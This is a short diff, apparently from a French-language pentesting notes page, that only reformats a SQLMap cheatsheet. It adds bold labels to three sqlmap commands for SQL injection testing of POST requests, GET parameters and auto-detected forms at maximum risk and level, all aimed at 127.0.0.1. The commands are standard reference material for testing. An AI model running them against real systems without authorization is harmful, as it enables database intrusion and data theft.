@@ -102,6 +102,6 @@ Tests classiques
 <br/>
 SQLMap - Cheatsheet
 
-* POST: sqlmap -r req.txt -p pass
-* GET: sqlmap -u "http://127.0.0.1/index.php?id=1" --dbs
-* AUTO - FORMS: sqlmap -u 'http://127.0.0.1/index.php' --forms --dbs --risk=3 --level=5 --threads=4 --batch
+* **POST :** sqlmap -r req.txt -p pass
+* **GET :** sqlmap -u "http://127.0.0.1/index.php?id=1" --dbs
+* **AUTO - FORMS :** sqlmap -u 'http://127.0.0.1/index.php' --forms --dbs --risk=3 --level=5 --threads=4 --batch
